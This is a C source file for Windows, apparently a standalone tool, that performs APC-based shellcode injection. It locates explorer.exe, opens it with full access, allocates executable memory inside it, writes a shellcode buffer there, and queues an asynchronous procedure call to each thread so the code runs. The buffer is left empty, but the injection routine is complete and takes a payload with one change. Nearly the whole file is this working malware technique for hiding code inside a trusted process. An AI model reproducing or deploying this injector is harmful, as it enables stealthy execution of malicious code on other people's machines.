#include <Windows.h>
#include <TlHelp32.h>

//
// Definitions
//
//#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
//#define STATUS_OPEN_FAILED			0xC0000136
#define STATUS_SUCCESS				0x00000000
#define STATUS_MEMORY_NOT_ALLOCATED 0xC00000A0

DWORD GetThreadCount(DWORD);

int main() {
	BYTE					bBuf[] = "";

	//STARTUPINFOA				startupInfo;
	//PROCESS_INFORMATION		processInformation;
	CONST HANDLE			hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);							// NOLINT(misc-misplaced-const)
	HANDLE					hProcess;
	HANDLE					hThread;
	PROCESSENTRY32			processEntry = { sizeof(PROCESSENTRY32) };
	THREADENTRY32			threadEntry = { sizeof(THREADENTRY32) };
	PTHREAD_START_ROUTINE	apcRoutine;
	PDWORD					pdwthreadIds;
	CONST SIZE_T			cbShellSize = sizeof(bBuf);
	DWORD					dwPid;
	DWORD					cntThreads;
	DWORD					c = 0;
	LONG					lRetVal = STATUS_SUCCESS;
	LPVOID					lpShellAddress;

	if (Process32First(hSnapshot, &processEntry)) {
		while (_wcsicmp(processEntry.szExeFile, L"explorer.exe") != 0) {
			Process32Next(hSnapshot, &processEntry);
		}
	}

	dwPid = processEntry.th32ProcessID;
	//cntThreads = processEntry.cntThreads;
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, dwPid);

	//pdwthreadIds = (PDWORD)VirtualAlloc(NULL, cntThreads * sizeof(DWORD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	
	//
	// Create host process
	//
	//ZeroMemory(&startupInfo, sizeof startupInfo);
	//startupInfo.cb = sizeof startupInfo;
	//ZeroMemory(&processInformation, sizeof processInformation);
	//
	//if (!CreateProcessA(NULL, (LPSTR)"\"explorer.exe\"", NULL, NULL, FALSE,
	//	DETACHED_PROCESS, NULL, NULL, &startupInfo, &processInformation)) {
	//	return STATUS_OPEN_FAILED;
	//}
	//
	//dwPid = processInformation.dwProcessId;
	//if ((hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid)) == INVALID_HANDLE_VALUE) {
	//	lRetVal = STATUS_OPEN_FAILED;
	//	goto lblCleanup;
	//}
	//
	//cntThreads = GetThreadCount(dwPid);

	lpShellAddress = VirtualAllocEx(hProcess, NULL, cbShellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!lpShellAddress) {
		lRetVal = STATUS_MEMORY_NOT_ALLOCATED;
		goto lblCleanup;
	}
	
	apcRoutine = (PTHREAD_START_ROUTINE)lpShellAddress;
	WriteProcessMemory(hProcess, lpShellAddress, bBuf, cbShellSize, NULL);

	if (Thread32First(hSnapshot, &threadEntry)) {
		do {
			if (threadEntry.th32OwnerProcessID == processEntry.th32ProcessID) {
				//threadIds.push_back(threadEntry.th32ThreadID);
				//pdwthreadIds[c] = threadEntry.th32ThreadID;
				hThread = OpenThread(THREAD_ALL_ACCESS, TRUE, threadEntry.th32ThreadID);
				QueueUserAPC((PAPCFUNC)apcRoutine, hThread, 0);
				Sleep(1000 * 2);
				//c++;
			}
		} while (Thread32Next(hSnapshot, &threadEntry));
	}

	//for (c = 0; c < cntThreads; c++) {
	//	CONST DWORD threadId = pdwthreadIds[c];
	//	hThread = OpenThread(THREAD_ALL_ACCESS, TRUE, threadId);
	//	QueueUserAPC((PAPCFUNC)apcRoutine, hThread, 0);
	//	Sleep(1000 * 2);
	//}
		
lblCleanup:	
	//if (processInformation.hProcess) {
	//	CloseHandle(processInformation.hProcess);
	//}

	//if (processInformation.hThread) {
	//	CloseHandle(processInformation.hThread);
	//}

	//if (pdwthreadIds) {
	//	VirtualFree(pdwthreadIds, 0, MEM_RELEASE);
	//}
	
	return lRetVal;
}

DWORD GetThreadCount(CONST DWORD dwPid) {
	CONST HANDLE	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);																// NOLINT(misc-misplaced-const)
	PROCESSENTRY32	entry = { 0 };
	BOOL			ret;

	entry.dwSize = sizeof(entry);
	
	ret = Process32First(hSnapshot, &entry);
	while (ret && entry.th32ProcessID != dwPid) {
		ret = Process32Next(hSnapshot, &entry);
	}
	CloseHandle(hSnapshot);
	return ret
		? entry.cntThreads
		: -1;
}
